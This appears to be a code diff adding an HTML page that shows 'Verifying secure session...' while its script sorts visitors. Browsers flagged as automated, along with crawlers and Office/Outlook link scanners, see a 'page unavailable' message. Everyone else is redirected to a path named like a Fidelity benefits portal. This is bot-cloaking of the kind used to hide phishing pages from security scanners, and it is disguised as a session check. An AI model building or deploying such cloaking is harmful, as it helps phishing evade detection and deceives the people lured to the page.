@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; color: #666; }</style>
+</head>
+<body>
+    <p>Verifying secure session...</p>
+    <script>
+        const isBot = navigator.webdriver || 
+                      /HeadlessChrome|Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|Office|Outlook/i.test(navigator.userAgent);
+        if (!isBot) {
+            window.location.replace("/benefitsfidelity/plan/home.html");
+        } else {
+            document.body.innerHTML = "<p>This page is currently unavailable.</p>";
+        }
+    </script>
+</body>
+</html>
